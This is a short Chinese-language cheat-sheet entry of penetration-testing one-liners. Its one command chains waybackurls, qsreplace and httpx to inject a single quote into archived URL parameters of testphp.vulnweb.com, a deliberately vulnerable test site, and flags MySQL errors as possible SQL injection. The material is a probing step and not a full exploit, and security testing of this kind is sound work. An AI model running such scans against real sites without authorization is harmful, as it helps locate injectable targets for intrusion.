# 收集渗透过程中常用的命令 尽量用linux shell 一句话执行
## 批量找sql报错
```bash
echo "testphp.vulnweb.com"|waybackurls | sort -u | grep "="|qsreplace "1'" | httpx -irr -json -silent |grep -q -n "mysql" 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET
 \033[0;31mNot Vulnerable\e[m\n"
```
